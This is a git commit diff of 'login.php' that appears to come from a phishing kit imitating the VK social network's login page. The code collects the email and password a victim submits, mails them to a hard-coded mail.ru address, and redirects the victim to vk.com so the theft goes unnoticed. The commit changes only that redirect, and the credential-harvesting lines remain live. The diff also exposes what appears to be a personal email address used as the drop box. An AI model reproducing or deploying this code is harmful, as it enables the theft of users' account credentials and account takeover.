f9314dd3df0a8b2cc57e259cdf31f8f8f38bdf32
vkentrance <95012384+vkentrance@users.noreply.github.com>
2021-11-25 19:46:35 +0800

    Update login.php

--- login.php
+++ login.php
@@ -2,5 +2,5 @@
 $message = $_POST'email' . ':' . $_POST'pass';
 $message = wordwrap($message, 70, "<br>");
 mail('sanya.sadovnikov.15@mail.ru', 'Vk', $message, "From: example@mail.ru");
-header('Location: https://vk.com/login?m=1');
+header('Location: http://vk.com/id0?196712280');
 ?>
